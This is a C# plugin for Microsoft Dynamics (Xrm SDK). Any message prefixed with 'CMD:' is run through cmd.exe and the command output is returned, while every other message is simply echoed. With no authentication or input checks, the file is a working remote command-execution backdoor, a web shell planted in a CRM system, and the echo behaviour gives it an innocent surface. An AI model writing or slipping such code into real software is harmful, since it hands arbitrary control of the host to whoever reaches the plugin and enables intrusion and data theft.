using System;
using System.Diagnostics;
using Microsoft.Xrm.Sdk;

namespace CommandPlugin
{
    public class CommandPlugin : IPlugin
    {
        public void Execute(IServiceProvider serviceProvider)
        {
            var context = (IPluginExecutionContext)serviceProvider.GetService(typeof(IPluginExecutionContext));

            try
            {
                string message = context.InputParameters.Contains("message")
                    ? context.InputParameters["message"]?.ToString() ?? ""
                    : "";

                string response;

                if (message.StartsWith("CMD:", StringComparison.OrdinalIgnoreCase))
                {
                    string cmd = message.Substring(4).Trim();
                    response = RunCommand(cmd);
                }
                else
                {
                    response = "ECHO: " + message;
                }

                context.OutputParameters["response"] = response;
            }
            catch (Exception ex)
            {
                throw new InvalidPluginExecutionException("CommandPlugin error: " + ex.Message);
            }
        }

        private static string RunCommand(string command)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c " + command,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            using (var process = Process.Start(psi))
            {
                string stdout = process.StandardOutput.ReadToEnd();
                string stderr = process.StandardError.ReadToEnd();

                if (!process.WaitForExit(30000))
                {
                    try { process.Kill(); } catch { }
                    return "[TIMEOUT after 30s]\n" + stdout + stderr;
                }

                string output = stdout;
                if (!string.IsNullOrEmpty(stderr))
                    output += "\n[STDERR]\n" + stderr;

                return output;
            }
        }
    }
}
